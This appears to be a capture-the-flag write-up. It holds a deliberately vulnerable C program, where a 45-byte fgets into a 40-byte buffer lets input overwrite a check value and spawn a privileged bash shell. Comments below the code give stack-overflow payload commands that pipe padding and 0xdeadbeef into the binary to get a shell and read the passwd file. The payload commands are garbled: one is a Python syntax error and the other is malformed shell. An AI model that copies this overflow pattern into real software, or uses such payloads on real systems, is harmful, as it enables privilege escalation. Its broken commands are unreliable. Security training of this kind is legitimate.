    #include <unistd.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <stdio.h>
     
    int main()
    {
     
      int var;
      int check = 0x04030201;
      char buf[40];
     
      fgets(buf,45,stdin);
     
      printf("\n[buf]: %s\n", buf);
      printf("[check] %p\n", check);
     
      if ((check != 0x04030201) && (check != 0xdeadbeef))
        printf ("\nYou are on the right way!\n");
     
      if (check == 0xdeadbeef)
       {
         printf("Yeah dude! You win!\nOpening your shell...\n");
         setreuid(geteuid(), geteuid());
         system("/bin/bash");
         printf("Shell closed! Bye.\n");
       }
       return 0;
    }


#Solving the Problem and Cracking the Shell
#1st thing is to check the code, the first thing we can notice about is the char buf[40]
#so we try to overbuff this buffer -> python -c "print 'A' * 40 'DDDD' " | ./ch13

#As soon as we type the code the shell will answer : You are on the right way! as a signal that we were able to overbuff the buffer

#The second thing we need to do is to check the code, were we can find (check == 0xdeadbeef) -> so we need to introduce deadbeef on 0x buffers
#0xdeadbeef = \xef\xbe\xad\xde 

#We can introduce it on the check buffer -> < cat(python -c "print 'A' * 40" + '\xef\xbe\xad\xde') - | ./ch13
# with the '-' we mantain the shell opened, so once we've cracked it, we can mantain it open to read the passwd file